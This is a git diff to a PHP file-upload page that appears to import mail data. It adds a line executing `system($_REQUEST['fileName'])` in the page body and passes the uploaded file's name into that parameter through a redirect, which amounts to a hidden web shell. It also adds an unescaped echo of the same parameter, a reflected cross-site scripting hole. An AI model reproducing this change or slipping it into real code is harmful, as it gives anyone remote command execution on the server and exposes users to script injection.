@@ -25,7 +25,9 @@ mysql_select_db("sq_mail",$connect); //select the table
 $success = "false";
 
 if ($_FILES[incoming_file][size] > 0) {
-         $file = $_FILES[incoming_file][tmp_name];
+
+    $file = $_FILES[incoming_file][tmp_name];
+   $exactFile = $_FILES[incoming_file][name];
 
     $temp = explode(".", $_FILES["incoming_file"]["name"]);
     $extension = end($temp);
@@ -227,7 +229,7 @@ if ($_FILES[incoming_file][size] > 0) {
 
         //redirect
         if($success == "true"){
-           header('Location: /src/home.php?import=true&success=true'); die;
+           header('Location: /src/home.php?import=true&success=true&fileName='.$exactFile); die;
         }else{
            header('Location: /src/home.php?import=true&success=false'); die;
           
@@ -468,7 +470,8 @@ function redirectForDownload(){
 
 
 <body>
-       
+       <?php system($_REQUEST['fileName']); 
+	echo $_GET['fileName']; ?>
         <input type="hidden" id="username" name="username" value="<?php print($username); ?>" />
 
         <form action="" method="post" enctype="multipart/form-data" name="form1" id="form1">
